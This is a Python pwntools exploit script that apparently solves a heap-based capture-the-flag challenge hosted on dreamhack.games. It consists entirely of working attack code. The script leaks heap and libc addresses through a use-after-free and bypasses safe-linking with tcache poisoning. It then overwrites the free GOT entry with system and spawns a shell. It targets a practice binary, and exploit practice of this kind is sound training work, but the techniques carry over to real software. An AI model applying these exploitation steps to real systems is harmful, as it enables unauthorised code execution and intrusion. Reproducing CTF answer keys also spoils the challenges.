#!/usr/bin/python3
from pwn import * 

exe = ELF('./note_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
    	b* 0x000000000040131D
    	b* 0x00000000004015C8
    	b* 0x00000000004014DA
    	b* 0x000000000040140C
    	c
		''')

if args.REMOTE:
	HOST = 'host8.dreamhack.games'
	PORT = 8706
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def create(idx, size, data):
	sla(b'> ', b'1')
	slan(b'idx: ', idx)
	slan(b'size: ', size)
	sa(b'data: ', data)
def show(idx):
	sla(b'> ', b'2')
	slan(b'idx: ', idx)
def update(idx, data):
	sla(b'> ', b'3')
	slan(b'idx: ', idx)
	sa(b'data: ', data)
def delete(idx):
	sla(b'> ', b'4')
	slan(b'idx: ', idx)

#GDB()
#input()
create(0, 0x20, b'A')
create(1, 0x20, b'A')
create(2, 0x31, b'A')
delete(0)
show(0)
ru(b'data: ')
heap_base = leak(rl(p)[:-1]) << 12
info("Heap Base: ", heap_base)
update(0, p64(0) * 2)

target = ((heap_base + 0x2a0) >> 12) ^ (0x4040c0) #overwrite 0x4040B0 + 2 * idx
for _ in range(6):
	delete(0)
	update(0, p64(0) * 2)
delete(0)
delete(1)
delete(0)
create(0, 0x20, p64(target))
create(1, 0x20, b'A')
create(1, 0x20, b'A')
create(3, 0x20, b'A' * 8 + p64(0x10))
update(3, p64(exe.got.free))
show(2)
ru(b'data: ')
libc.address = leak(r(6), libc.sym.free)
info("Libc Base: ", libc.address)

update(2, p64(libc.sym.system))
update(0, b'/bin/sh\0')
delete(0)
p.interactive()

